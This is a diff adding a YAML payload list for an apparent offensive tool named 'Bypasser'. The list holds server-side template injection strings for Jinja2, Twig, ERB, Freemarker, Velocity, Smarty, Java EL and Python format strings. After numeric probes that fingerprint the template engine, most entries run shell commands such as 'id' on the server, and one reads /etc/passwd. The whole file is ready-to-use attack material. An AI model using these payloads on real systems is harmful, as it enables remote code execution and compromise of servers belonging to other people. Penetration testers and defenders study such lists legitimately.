@@ -1,0 +1,67 @@
+# Bypasser - payloads SSTI por engine (Jinja2, Twig, ERB, Freemarker, Velocity, Smarty)
+# Dica: rode primeiro as sondas numericas ({{7*7}}) para identificar a engine.
+payloads:
+  # --- sondas numericas (identificar engine) ---
+  - "{{7*7}}"
+  - "{{7*'7'}}"
+  - "${7*7}"
+  - "<%= 7*7 %>"
+  - "#{7*7}"
+  - "*{7*7}"
+  - "${{7*7}}"
+
+  # --- Jinja2 / Python ---
+  - "{{config}}"
+  - "{{self.__class__.__mro__}}"
+  - "{{''.__class__.__mro__[1].__subclasses__()}}"
+  - "{{'x'.__class__.__mro__[1].__subclasses__()}}"
+  - "{{lipsum.__globals__['os'].popen('id').read()}}"
+  - "{{cycler.__init__.__globals__.os.popen('id').read()}}"
+  - "{{joiner.__init__.__globals__.os.popen('id').read()}}"
+  - "{{namespace.__init__.__globals__.os.popen('id').read()}}"
+  - "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"
+  - "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
+  # {{''.__class__.__mro__[1].__subclasses__()[IDX]('id')}} - ajuste IDX ao indice de subprocess.Popen
+
+  # --- Twig (PHP) ---
+  - "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"
+  - "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}"
+  - "{{['id']|filter('system')}}"
+  - "{{['id']|map('system')}}"
+  - "{{['id']|reduce('system','')}}"
+
+  # --- ERB / Ruby ---
+  - "<%= system('id') %>"
+  - "<%= `id` %>"
+  - "<%= IO.popen('id').read %>"
+  - "<%= require 'open3'; Open3.capture3('id') %>"
+  - "<%= File.read('/etc/passwd') %>"
+  - "#{system('id')}"
+  - "%x{id}"
+
+  # --- Freemarker (Java) ---
+  - "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}"
+  - "<#assign value='freemarker.template.utility.Execute'?new()>${value('id')}"
+  - "${'freemarker.template.utility.Execute'?new()('id')}"
+  - "<#assign a='freemarker.template.utility.Execute'?new()>${a('ls')}"
+
+  # --- Velocity (Java) ---
+  - "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('id'))$ex.waitFor()"
+  - "#set($e='exec')#set($a=$x.class.forName('java.lang.Runtime').getRuntime().exec('id'))"
+
+  # --- Smarty (PHP) ---
+  - "{system('id')}"
+  - "{php}system('id');{/php}"
+  - "{$smarty.version}"
+  - "{if system('id')}{/if}"
+  - "{literal}{/literal}{system('id')}"
+
+  # --- Java EL / Spring ---
+  - "${T(java.lang.Runtime).getRuntime().exec('id')}"
+  - "${''.getClass().forName('java.lang.Runtime').getRuntime().exec('id')}"
+  - "#{T(java.lang.Runtime).getRuntime().exec('id')}"
+
+  # --- Python format string ---
+  - "{0.__class__.__mro__[1].__subclasses__()}"
+  - "{0.__class__.__bases__[0].__subclasses__()}"
+  - "{{0.__class__.__mro__[1].__subclasses__()}}"
